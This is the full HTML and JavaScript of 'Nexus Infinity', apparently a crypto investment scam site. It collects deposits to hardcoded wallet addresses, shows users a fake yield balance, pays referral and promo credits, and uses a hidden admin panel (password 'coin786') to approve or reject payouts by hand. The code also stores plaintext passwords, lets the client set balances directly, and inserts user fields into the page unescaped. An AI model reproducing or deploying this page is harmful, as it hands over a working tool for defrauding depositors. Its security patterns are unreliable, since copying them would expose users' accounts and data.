<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --neon-pink: #ff00ff; --neon-red: #ff003c; --glass: rgba(10, 10, 10, 0.95); }
        body { background: #050505; color: #f8f9fa; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .glass-panel { background: var(--glass); backdrop-filter: blur(50px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px; }
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); font-weight: 800; padding: 18px; border-radius: 20px; width: 100%; transition: 0.4s; text-transform: uppercase; letter-spacing: 1px; }
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 18px; padding: 18px; color: white; width: 100%; outline: none; }
        .nav-active { color: var(--neon-pink); text-shadow: 0 0 15px var(--neon-pink); }
        .hidden { display: none !important; }
        .auth-bg { background: linear-gradient(135deg, rgba(5,5,5,0.9), rgba(255,0,60,0.1)), url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000'); background-size: cover; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-[#050505] z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2.5rem] flex items-center justify-center text-5xl font-black text-white shadow-2xl animate-pulse italic">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-xs tracking-[0.5em] text-white">NEXUS INFINITY</h1>
    </div>

    <div id="auth-section" class="min-h-screen auth-bg flex items-center justify-center p-8 hidden">
        <div class="max-w-md w-full glass-panel p-10 space-y-6">
            <h2 class="text-center font-black italic text-xl uppercase tracking-widest">Access <span class="text-pink-500">Hub</span></h2>
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-master">Authorize</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Register New Identity</p>
            </div>
            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Create ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Create Key" class="input-hub">
                <input type="text" id="s-ref" placeholder="Referral ID (Optional)" class="input-hub">
                <button onclick="handleSignup()" class="btn-master">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 sticky top-0 bg-black/80 backdrop-blur-3xl z-50 border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-950 rounded-xl flex items-center justify-center font-black border border-white/10 italic">N</div>
                <span id="nav-user" class="text-xs font-black italic text-pink-500 uppercase">...</span>
            </div>
            <button onclick="logout()" class="text-zinc-600"><i class="fa-solid fa-power-off text-xl"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 to-black">
                <p class="text-[8px] font-black text-zinc-500 uppercase tracking-widest">Equity Balance</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between border-t border-white/5 pt-6">
                    <div><p class="text-[7px] text-zinc-500 uppercase font-black">Yield</p><p id="profit-txt" class="text-lg font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black">Invite Code</p><p id="my-ref" class="text-[10px] font-black text-blue-400 uppercase">...</p></div>
                </div>
            </div>

            <div class="glass-panel p-6 flex gap-3">
                <input type="text" id="promo-input" placeholder="Promo Code" class="input-hub !py-3 !text-[10px]">
                <button onclick="applyPromo()" class="btn-master !w-auto !px-6 !py-3 !text-[9px]">Apply</button>
            </div>

            <div id="active-nodes-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">Deposit Assets</h3>
                <div class="space-y-3">
                    <div class="bg-black/50 p-4 rounded-2xl border border-white/5 text-[10px] font-bold select-all break-all">Binance Pay: TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</div>
                    <div class="bg-black/50 p-4 rounded-2xl border border-white/5 text-[10px] font-bold select-all break-all">Trust Wallet: 0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</div>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                <input type="text" id="dep-tid" placeholder="Transaction Hash" class="input-hub">
                <input type="file" id="dep-proof" accept="image/*" class="text-[10px] block w-full file:bg-zinc-800 file:text-pink-500 file:border-0 file:rounded-full file:px-4">
                <img id="preview-img" class="mt-4 w-full h-32 rounded-3xl object-cover hidden border border-pink-500/30">
                <button onclick="submitDep()" class="btn-master">Inject Capital</button>
            </div>
            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-lg font-black italic uppercase">Withdraw Capital</h3>
                <select id="w-method" class="input-hub bg-zinc-950"><option>Binance Pay</option><option>Trust Wallet</option><option>MetaMask</option><option>OKX</option></select>
                <input type="text" id="w-addr" placeholder="Wallet Address" class="input-hub">
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-hub">
                <button onclick="submitWith()" class="btn-master !bg-zinc-800">Queue Payout</button>
            </div>
        </main>

        <main id="page-logs" class="p-6 space-y-4 hidden">
            <h3 class="text-lg font-black italic uppercase">Financial History</h3>
            <div id="history-list" class="grid gap-3"></div>
        </main>

        <main id="page-about" class="p-6 space-y-6 hidden pb-10">
            <div class="glass-panel p-8 space-y-4">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">About Nexus Infinity</h3>
                <p class="text-[11px] text-zinc-400 leading-relaxed">Nexus Infinity is a global institutional-grade infrastructure provider. We specialize in AI-driven node distribution and high-frequency asset management protocols. Established in 2024, our mission is to provide secure, transparent, and scalable digital asset growth.</p>
            </div>
            <div class="glass-panel p-8 space-y-4">
                <h3 class="text-sm font-black uppercase">FAQ & Support</h3>
                <div class="space-y-4">
                    <details class="text-[10px] border-b border-white/5 pb-2"><summary class="font-bold cursor-pointer">How long is node duration?</summary><p class="mt-2 text-zinc-500">Standard nodes operate for 30-45 cycles depending on tier.</p></details>
                    <details class="text-[10px] border-b border-white/5 pb-2"><summary class="font-bold cursor-pointer">What is the withdrawal time?</summary><p class="mt-2 text-zinc-500">Institutional payouts are processed within 2-6 hours after audit.</p></details>
                </div>
            </div>
            <div class="glass-panel p-8 space-y-4">
                <h3 class="text-[10px] font-black uppercase text-zinc-500">Privacy & Terms</h3>
                <p class="text-[9px] text-zinc-600 italic">By using this terminal, you agree to our 256-bit encryption standards and KYC-free institutional protocols. Capital loss is subject to market volatility.</p>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-black/80 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-house-signal text-xl mb-1"></i><p class="font-black uppercase text-[7px]">Home</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-xl mb-1"></i><p class="font-black uppercase text-[7px]">Vault</p></div>
            <div onclick="switchPage('logs')" class="nav-item"><i class="fa-solid fa-list-ul text-xl mb-1"></i><p class="font-black uppercase text-[7px]">Logs</p></div>
            <div onclick="switchPage('about')" class="nav-item"><i class="fa-solid fa-info-circle text-xl mb-1"></i><p class="font-black uppercase text-[7px]">Info</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-6"><h2 class="text-xl font-black italic text-pink-500">MASTER PANEL</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button></div>
        <div id="admin-requests" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const PROMO_CODES = { "FREE50": 50, "NEXUS100": 100, "SWEETIE": 500 };

        window.onload = () => {
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('my-ref').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toFixed(2);
                
                // Real-time History
                const history = data.history ? Object.values(data.history).reverse() : [];
                document.getElementById('history-list').innerHTML = history.map(h => `
                    <div class="glass-panel p-5 flex justify-between items-center border-l-4 ${h.status === 'Approved' ? 'border-green-500' : 'border-pink-500'}">
                        <div><p class="text-[9px] font-black uppercase tracking-widest">${h.type}</p><p class="text-[8px] text-zinc-500">${h.date}</p></div>
                        <div class="text-right"><p class="text-[11px] font-black italic">$${h.amount}</p><p class="text-[7px] font-bold uppercase ${h.status === 'Approved' ? 'text-green-500' : 'text-pink-500'}">${h.status}</p></div>
                    </div>`).join('') || '<p class="text-center opacity-20 py-10 font-black text-[9px]">NO ACTIVITY LOGS</p>';
            });
        }

        window.applyPromo = async () => {
            const code = document.getElementById('promo-input').value.trim().toUpperCase();
            const user = localStorage.getItem('nexus_user');
            if(PROMO_CODES[code]) {
                const snap = await get(ref(db, `users/${user}`));
                if(snap.val().promoUsed) return alert("Promo already used!");
                await update(ref(db, `users/${user}`), { balance: (snap.val().balance || 0) + PROMO_CODES[code], promoUsed: true });
                alert(`Promo Applied! $${PROMO_CODES[code]} Added.`);
            } else { alert("Invalid Code!"); }
        };

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Incomplete Data!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Deposit Protocol Logged.");
        };

        window.submitWith = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('w-amt').value, addr = document.getElementById('w-addr').value;
            if(!amt || !addr) return alert("Fields Required!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, address: addr, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Withdrawal Queued.");
        };

        window.manage = async (id, user, amt, hKey, action) => {
            if(action === 'approve') {
                const snap = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (snap.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else {
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, 'admin/requests/' + id));
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-4 border border-pink-500/20">
                        <div class="flex justify-between items-center"><span class="text-[9px] font-black text-pink-500 uppercase">${l.type}</span><span class="text-[8px] text-zinc-600">${l.date}</span></div>
                        <p class="text-xs">User: <span class="font-black italic">${l.user}</span> | Amt: <span class="text-green-500 font-black">$${l.amount}</span></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-40 object-cover rounded-3xl border border-white/5" onclick="window.open(this.src)">` : `<p class="text-[10px]">${l.address}</p>`}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve')" class="bg-green-600/30 text-green-500 py-4 rounded-2xl text-[10px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject')" class="bg-red-600/30 text-red-500 py-4 rounded-2xl text-[10px] font-black uppercase">Reject</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 font-black text-[10px]">ALL CLEAR</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','vault','logs','about'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), snap = await get(ref(db, `users/${u}`)); if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied!"); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), refId = document.getElementById('s-ref').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: refId }); if(refId) { const rSnap = await get(ref(db, `users/${refId}`)); if(rSnap.exists()) { await update(ref(db, `users/${refId}`), { balance: (rSnap.val().balance || 0) + 5 }); } } alert("Authorized!"); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
